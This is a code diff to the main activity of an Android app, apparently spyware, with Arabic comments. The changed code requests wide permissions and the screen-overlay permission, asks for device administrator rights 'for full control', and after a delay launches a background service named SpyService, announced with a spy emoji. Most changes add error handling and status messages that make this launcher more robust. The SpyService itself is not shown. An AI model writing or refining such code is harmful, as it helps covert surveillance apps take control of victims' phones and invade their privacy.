@@ -1,7 +1,6 @@
 package com.black.phone;
 
 import android.Manifest;
-import android.app.Activity;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
@@ -11,7 +10,6 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
-import android.util.Log;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.Toast;
@@ -19,6 +17,7 @@ import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import com.google.firebase.FirebaseApp;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -35,16 +34,23 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         context = this;
 
-        // تهيئة Firebase
-        com.google.firebase.FirebaseApp.initializeApp(this);
+        // 🔥 الخطوة 1: تهيئة Firebase فوراً (قبل أي شيء)
+        try {
+            if (FirebaseApp.getApps(this).isEmpty()) {
+                FirebaseApp.initializeApp(this);
+                Toast.makeText(this, "✅ Firebase initialized", Toast.LENGTH_SHORT).show();
+            }
+        } catch (Exception e) {
+            Toast.makeText(this, "❌ Firebase error: " + e.getMessage(), Toast.LENGTH_LONG).show();
+        }
 
-        // طلب الصلاحيات
+        // الخطوة 2: طلب الصلاحيات
         requestAllPermissions();
 
-        // طلب صلاحية المدير
+        // الخطوة 3: طلب صلاحية المدير
         requestDeviceAdmin();
 
-        // بدء الخدمة بعد ثوانٍ (لإعطاء وقت للصلاحيات)
+        // الخطوة 4: بدء الخدمة بعد ثوانٍ (لإعطاء وقت للصلاحيات)
         new android.os.Handler().postDelayed(this::startSpyService, 3000);
     }
 
@@ -96,7 +102,8 @@ public class MainActivity extends AppCompatActivity {
 
         // صلاحية التجاوز
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
             startActivityForResult(intent, REQUEST_OVERLAY);
         }
 
@@ -115,17 +122,23 @@ public class MainActivity extends AppCompatActivity {
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
             intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب صلاحية المدير للتحكم الكامل");
             startActivityForResult(intent, REQUEST_ADMIN);
+        } else {
+            Toast.makeText(this, "✅ صلاحية المدير مفعلة", Toast.LENGTH_SHORT).show();
         }
     }
 
     private void startSpyService() {
-        Intent serviceIntent = new Intent(this, SpyService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
+        try {
+            Intent serviceIntent = new Intent(this, SpyService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
+            }
+            Toast.makeText(this, "🕵️ الخدمة تعمل في الخلفية", Toast.LENGTH_SHORT).show();
+        } catch (Exception e) {
+            Toast.makeText(this, "❌ فشل بدء الخدمة: " + e.getMessage(), Toast.LENGTH_LONG).show();
         }
-        Toast.makeText(this, "🕵️ الخدمة تعمل", Toast.LENGTH_SHORT).show();
     }
 
     @Override
@@ -142,7 +155,7 @@ public class MainActivity extends AppCompatActivity {
             if (allGranted) {
                 Toast.makeText(this, "✅ جميع الصلاحيات ممنوحة", Toast.LENGTH_SHORT).show();
             } else {
-                Toast.makeText(this, "⚠️ بعض الصلاحيات غير ممنوحة، قد تعمل الخدمة جزئياً", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "⚠️ بعض الصلاحيات غير ممنوحة", Toast.LENGTH_LONG).show();
             }
         }
     }
